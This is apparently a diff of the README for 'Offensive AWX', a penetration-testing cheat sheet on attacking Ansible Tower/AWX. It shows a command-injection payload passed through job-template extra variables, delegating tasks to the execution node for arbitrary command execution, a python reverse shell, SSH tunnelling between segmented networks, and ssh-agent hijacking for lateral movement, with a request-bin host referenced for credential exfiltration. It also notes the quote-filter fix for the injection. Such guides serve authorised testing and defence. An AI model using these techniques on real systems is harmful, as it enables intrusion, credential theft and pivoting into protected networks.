@@ -4,28 +4,34 @@ Offensive AWX consists of cheat sheets and information to pentest Ansible Tower 
 
 Access to AWX can often be leveraged to pivot in an environment and gain remote code executions on servers.
 
-* [Install AWX CLI](#install-awx-cli)
-* [Authentication](#authentication)
-  * [Username and password](#username-and-password)
-  * [Inline](#inline)
-  * [Tokens](#tokens)
-* [Reconnaissance](#reconnaissance)
-  * [Version](#version)
-  * [Organizations](#organizations)
-  * [Projects](#projects)
-  * [Inventories](#inventories)
-  * [Groups](#groups)
-  * [Hosts](#hosts)
-  * [Credentials](#credentials)
-* [Code execution](#code-execution)
-  * [Ad-Hoc commands](#ad-hoc-commands)
-  * [Code execution through projects](#code-execution-through-projects)
-    * [Creating or modifying projects](#creating-or-modifying-projects)
-    * [Job templates](#job-templates)
-* [Credential stealing](#credential-stealing)
-  * [Thycotic secret server (Delinea)](#thycotic-secret-server-delinea)
-  * [Source Control (username, password, PAT)](#source-control-username-password-pat)
-  * [Machine (username, password)](#machine-username-password)
+- [Offensive AWX](#offensive-awx)
+  - [Install AWX CLI](#install-awx-cli)
+  - [Authentication](#authentication)
+    - [Username and password](#username-and-password)
+    - [Inline](#inline)
+    - [Tokens](#tokens)
+  - [Reconnaissance](#reconnaissance)
+    - [Version](#version)
+    - [Organizations](#organizations)
+    - [Projects](#projects)
+    - [Inventories](#inventories)
+    - [Groups](#groups)
+    - [Hosts](#hosts)
+    - [Credentials](#credentials)
+  - [Code execution](#code-execution)
+    - [Ad-Hoc commands](#ad-hoc-commands)
+    - [Code execution through projects](#code-execution-through-projects)
+      - [Creating or modifying projects](#creating-or-modifying-projects)
+      - [Job templates](#job-templates)
+    - [Extra variables injection](#extra-variables-injection)
+  - [Credential stealing](#credential-stealing)
+    - [Thycotic secret server (Delinea)](#thycotic-secret-server-delinea)
+    - [Source Control (username, password, PAT)](#source-control-username-password-pat)
+    - [Machine (username, password)](#machine-username-password)
+  - [Execution node compromission](#execution-node-compromission)
+    - [Reverse shell](#reverse-shell)
+    - [Tunneling](#tunneling)
+    - [Lateral movement](#lateral-movement)
 
 ## Install AWX CLI
 
@@ -262,6 +268,52 @@ Changing a job template's branch:
 awx job_templates modify <id> --scm_branch "main"
 ```
 
+### Extra variables injection
+
+**Extra variables** provided at the launch of a job_template [take precedence over all other sources of variables](https://docs.ansible.com/ansible-tower/latest/html/userguide/job_templates.html#extra-variables).
+This makes it possible to override variables even if they were not intented to be specified at this level. Specifying a new value for an existing variable will overwrite its value.
+This is therefore exploitable when variables are used in insecure ways.
+
+Here is an example of an insecure use of a variable : 
+
+```yml
+---
+- name: read a file 
+  hosts: all 
+  vars:
+    filepath: /etc/passwd
+  tasks:
+    - name: Show a file's contents
+      ansible.builtin.shell: |
+        cat '{{ filepath }}'
+```
+
+The code above will execute the `cat` command on the file specified in the `filepath` extra variable.
+In this example, the `job_template` only allows the launcher to specify the extra variables.
+
+It would then be possible to exploit the playbook by using the following `awx` command :
+
+```bash
+EXTRA_VARS="{\"filepath\": \"';whoami;#\"}"
+awx job_template launch --extra_vars "${EXTRA_VARS}" <job_template_id>
+```
+
+This would then cause a command injection when this task is processed.
+
+```bash
+cat '{{ filepath }}' --> cat '';whoami;#
+```
+
+Since the playbook did not use the [quote](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/quote_filter.html) filter to escape the variable for safe shell use, we are able to escape the quotes and inject our command.
+Changing the template command to the following will fix this vulnerability :
+
+```bash
+cat '{{ filepath | quote }}'
+```
+
+This is useful when you are constrained in what you can change about the job_template you have execution rights on.
+Most of the time, this is when a system administrators has delegated certain job_templates to an actor for their work related activities.
+
 ## Credential stealing
 
 Credentials stealing will between different types of credentials. Here are listed some techniques for some common types of credentials.
@@ -313,55 +365,7 @@ REQUEST_BIN="http://example.com:5000/"
 awx projects 
 ```
 
-## Extra variables injection
-
-**Extra variables** provided at the launch of a job_template [take precedence over all other sources of variables](https://docs.ansible.com/ansible-tower/latest/html/userguide/job_templates.html#extra-variables).
-This makes it possible to override variables even if they were not intented to be specified at this level.
-The variable could already be defined and it would still be overriden by the extra variables coming from the launch.
-This is therefore exploitable when variables are used in insecure ways.
-
-Here is an example of an insecure use of a variable : 
-
-```yml
----
-- name: read a file 
-  hosts: all 
-  vars:
-    filepath: /etc/passwd
-  tasks:
-    - name: Show a file's contents
-      ansible.builtin.shell: |
-        cat '{{ filepath }}'
-```
-
-The code above will execute the `cat` command on the file specified in the `filepath` extra variable.
-In this example, the `job_template` only allows the launcher to specify the extra variables.
-
-It would then be possible to exploit the playbook by using the following `awx` command :
-
-```bash
-EXTRA_VARS="{\"filepath\": \"';whoami;#\"}"
-awx job_template launch --extra_vars "${EXTRA_VARS}" <job_template_id>
-```
-
-This would then cause a command injection when this task is processed.
-
-```bash
-cat '{{ filepath }}' --> cat '';whoami;#
-```
-
-Since the playbook did not use the [quote](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/quote_filter.html) filter to escape the variable for safe shell use, we are able to escape the quotes and inject our command.
-Changing the template command to the following will fix this vulnerability :
-
-```bash
-cat '{{ filepath | quote }}'
-```
-
-This is useful when you are constrained in what you can change about the job_template you have execution rights on.
-Most of the time, this is when a system administrators has delegated certain job_templates to an actor for their work related activities.
-
-
-## Compromising the execution node for pivoting 
+## Execution node compromission
 
 It is possible to delegate the execution of a task to a given host when executing a playbook.
 To do so, we can use the [delegate_to](https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_delegation.html#delegating-tasks) keyword on a task. This keyword needs a host as argument.
@@ -381,8 +385,9 @@ Here is an exemple of a delegated task:
 ```
 
 This would cause the second task to run on `host-1`, all other tasks will be executed on the target hosts.
-Using this delegation method, we can execute arbitrary commands on the execution node.
-From there, one can perform enumeration of project artifacts and sometimes grab secrets like vault passwords, that are sent in clear text.
+Using this delegation method, we can **execute arbitrary commands** on the execution node.
+
+From there, one can perform enumeration of project artifacts and sometimes grab secrets, like vault passwords, that are sent in clear text.
 
 Interesting pivoting techniques are possible if the `machine id` uses an SSH key for authenticaton.
 This is because, when a `job_template` is launched, a new pod is created by `awx-operator`, the context of the execution is sent to this pod and the `machine id` credential is configured in the local `ssh-agent`.
@@ -402,9 +407,9 @@ Afterwards, the key is added to the agent and finally, the playbook is launched.
 
 Therefore, by delegating a task to `127.0.0.1`, we can target the execution node and stop the playbook in its tracks.
 Since the `ssh-agent` is already configured and any passphrase needed has been given, we can use ssh commands directly.
-Some techniques leveraging this will be detailed below.
+Some techniques leveraging this are detailed below.
 
-### Obtaining a reverse shell
+### Reverse shell
 
 The execution nodes are pretty slim environments.
 Therefore, most of the usual suspects that are normally used to gain a shell on a linux system are not present.
@@ -459,14 +464,13 @@ To do that, we can use the `ansible.module.shell` module again, but specify pyth
         var: stdout
 ```
 
-This should return send us a reverse shell and we skipped spawning a bash shell before hand.
-Example playbooks allowing you to prompt which command or python code is executed on launch are available in the `playbooks/` directory at the root of this repository.
+This should send us a reverse shell without the use of a shell script.
+Example playbooks allowing you to prompt which command or python code is executed on launch are available in the [playbooks directory](./playbooks/) at the root of this repository.
 
 ### Tunneling
 
-Using this we can create SSH tunnels between hosts, this can be useful for pivoting in different subnets.  
-Here is an example that assumes a certain level of segregation between the dev and prod environments.
-However, the AWX instance is used to manage both subnets, without proper segregation.
+Using remote code execution on the execution node, we can create SSH tunnels between hosts. This can be useful for pivoting in different subnets.  
+Here is an example that assumes a certain level of segmentation between the dev and prod environments. You can't reach the prod environment from the dev environment. However, the AWX instance is used to manage both subnets, without proper segmentation. We use the execution node to build a reverse port forwarding ssh connection that creates a tunnel between the `dev-host` on port 9999 to the `prod-host` on port 25.
 
 ```yml
 ---
@@ -488,10 +492,9 @@ We used SMTP as an example.
 ### Lateral movement
 
 Using this, we can also hijack the `ssh-agent` to connect to a host we would normally not be able to interact with through AWX.  
-This does depends on a reuse of credentials (SSH key or password) to be exploitable, but it happens often in larger environments.  
+This does depends on a reuse of credentials (SSH key or password) to be exploitable.  
 
-Assuming we have an inventory containing only `host-1`, and we do not have the rights to modify it.
-There is a second host called `host-2` to which we want to connect, but we have no way to through AWX.
+Assuming we have an inventory containing only `host-1`, and we do not have the rights to modify it. There is a second host called `host-2` to which we want to connect, but we have no way to through AWX.
 
 Here is an example that leverages this technique to pivot on `host-2` :
 
@@ -506,4 +509,3 @@ Here is an example that leverages this technique to pivot on `host-2` :
       delegate_to: 127.0.0.1 
 ```
 > The `-o StrictHostKeyChecking=no` flag disabled host verification to avoid issues relating to that while pivoting.
-
